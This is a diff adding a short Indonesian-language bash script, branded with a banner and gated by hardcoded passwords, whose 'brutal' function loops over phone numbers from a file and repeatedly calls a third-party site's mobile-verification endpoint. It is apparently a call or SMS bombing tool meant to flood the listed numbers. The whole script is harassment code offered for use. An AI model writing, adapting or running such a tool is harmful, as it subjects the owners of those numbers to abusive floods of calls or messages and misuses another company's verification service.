@@ -1,0 +1,67 @@
+#!/bin/bash
+#warna
+r='\033[1;31m'
+o='\033[0m'
+g='\033[1;32m'
+y='\033[1;33m'
+b='\033[1;34m'
+c='\033[1;36m'
+p='\033[1;35m'
+clear
+baner(){
+echo '
+██     ██ ██▄   ▄██ ██ ████████               
+██     ▄▄ ██▀█▄█▀██ ▄▄    ██  ╔═╗   ╔═╔═        
+██     ██ ██  ▀  ██ ██    ██  ╚═╣╣ ╣╠═╠═╔═╗        
+██████ ██ ██     ██ ██    ██    ╚╚═╝╚═╚═╣ ╣
+╔══════════════════════════════════════════════╗	
+Code By LimitQueen                                            
+Github : https://github.com/LimitQueenProject
+YOuTube : Limit Queen Project
+╚══════════════════════════════════════════════╝
+' | lolcat
+}
+
+tanya(){
+read -p $'\033[1;32m SCRIPT INI DI KUNCI MAU MINTA KATA SANDI ? \033[1;35my\033[0m/\033[1;35mn\033[0m' sa
+if [[ $sa == y || $sa == ya || $sa == mau ]]; then
+xdg-open wa.me/6281212624360?text=roy+sandi+telpon+brutal+apa
+else
+sandi
+fi
+}
+
+sandi(){
+baner
+read -p $'\033[1;32mMasukan kata sandi :\033[0m ' passwo
+if [[ $passwo == "janji mau share" ]]; then
+echo -e "${g}Kata sandi benar"
+sleep 2
+clear
+baner
+brutal
+elif [[ $passwo == "limsky" ]]; then
+echo  -e "${g}Kata sandi benar"
+sleep 2
+clear
+baner
+brutal
+else
+echo -e "$r Kata sandi salah"
+sleep 2
+sandi
+fi
+
+}
+
+
+
+brutal(){
+for nomor in $(cat no); do
+curl -s https://id.jagreward.com/member/verify-mobile/$nomor
+sleep 1
+echo
+done
+
+}
+tanya
